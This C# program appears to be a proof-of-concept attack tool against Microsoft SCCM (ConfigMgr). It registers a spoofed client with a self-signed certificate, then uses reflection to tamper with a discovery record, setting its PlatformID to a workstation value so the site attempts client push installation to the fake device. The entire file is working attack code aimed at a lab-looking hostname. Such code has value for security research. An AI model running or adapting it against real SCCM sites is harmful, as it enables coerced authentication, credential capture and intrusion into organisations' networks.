using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using System.Xml.Serialization;
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace RegisterClient
{
    class Program
    {
        static void Main(string[] args)
        { 
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();
            // Generate certificate for signing messages
            string[] oidPurposes = new string[] {};
            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ClientCert", "ClientCert", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
            // Create a registration request
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
            // Add our certificate for message signing
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            // Set the destination hostname
            registrationRequest.Settings.HostName = "atlas.aperture.science";
            // Discover local properties for registration metadata
            Console.WriteLine("[+] Discovering local properties");
            registrationRequest.Discover();
            registrationRequest.ClientFqdn = "test-yo.local";
            registrationRequest.NetBiosName = "test-yo";
            Console.WriteLine($"  ClientFqdn: {registrationRequest.ClientFqdn}"); // HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            Console.WriteLine($"  NetBiosName: {registrationRequest.NetBiosName}"); // HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            Console.WriteLine($"  RequestedSmsId: {registrationRequest.RequestedSmsId}");
            registrationRequest.SiteCode = "PS1";
            Console.WriteLine($"  SiteCode: {registrationRequest.SiteCode}");
            Console.WriteLine($"  SmsId: {registrationRequest.SmsId}"); // Should be empty so that a new unique ID can be set for the new object
            registrationRequest.SerializeMessageBody();
            Console.WriteLine($"  Body: { registrationRequest.Body}"); // Raw XML message body
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            // Register client and wait for a confirmation with the SMSID
            //SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
            //Console.WriteLine($"[+] Received unique ID for new device: {clientId.ToString()}");
            // Send data to the site - not sure this is even necessary
            //registrationRequest.Validate(sender);
            //registrationRequest.SendMessage(sender);

            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();
            ddrMessage.Discover();
            ddrMessage.InventoryReport = ddrMessage.BuildInventoryMessage(ddrMessage.DdrInstances);
            //Console.WriteLine($"[+] Discovered data:");
            //Console.WriteLine(ddrMessage.InventoryReport.ReportBody.RawXml);

            // Modify DDR XML
            //string xmlData = "<?xml version=\"1.0\"?><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"CCM_ExtNetworkAdapterConfiguration\" ParentClass=\"CCM_ExtNetworkAdapterConfiguration\"><CCM_ExtNetworkAdapterConfiguration><FQDN>test-yo.local</FQDN></CCM_ExtNetworkAdapterConfiguration></Instance><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"CCM_DiscoveryData\" ParentClass=\"CCM_DiscoveryData\"><CCM_DiscoveryData><PlatformID>Microsoft Windows NT Workstation 2010.0</PlatformID></CCM_DiscoveryData></Instance><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"CCM_NetworkAdapterConfiguration\" ParentClass=\"CCM_NetworkAdapterConfiguration\"><CCM_NetworkAdapterConfiguration><IPSubnet>192.168.57.0</IPSubnet><IPSubnet>254.128.0.0</IPSubnet></CCM_NetworkAdapterConfiguration></Instance><Instance Content=\"New\" Namespace=\"\\\\test-yo\\root\\ccm\" Class=\"Win32_NetworkAdapterConfiguration\" ParentClass=\"Win32_NetworkAdapterConfiguration\"><Win32_NetworkAdapterConfiguration><IPAddress>192.168.57.101</IPAddress><IPAddress>fe80::9d04:12d5:b6cd:c139</IPAddress><Index>1</Index><MACAddress>00:50:56:2B:CD:37</MACAddress></Win32_NetworkAdapterConfiguration></Instance>";
            string xmlData = ddrMessage.InventoryReport.ReportBody.RawXml;
            xmlData = xmlData.Replace(ddrMessage.Settings.SourceHost.ToString(), "test-yo");
            XmlDocument xmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            xmlDoc.LoadXml("<root>" + xmlData + "</root>");
            XmlNode platformId = xmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformId.InnerXml}");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            platformId.InnerText = "Microsoft Windows NT Workstation 2010.0";
            XmlNode modifiedXml = xmlDoc.SelectSingleNode("//root");
            xmlData = modifiedXml.InnerXml;

            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, xmlData);
            //Console.WriteLine($"[+] Modified data:");
            //Console.WriteLine(ddrMessage.InventoryReport.ReportBody.RawXml);

            // Assemble message and send
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.Settings.HostName = "atlas.aperture.science";
            //ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            ddrMessage.SmsId = new SmsClientId("GUID:9B366359-0E3F-4CDE-AF0F-892AC2F2826A");
            ddrMessage.SiteCode = "PS1";
            ddrMessage.Validate(sender);
            ddrMessage.SendMessage(sender);

            // Need to dispose of cert when done?
        }
    }
}
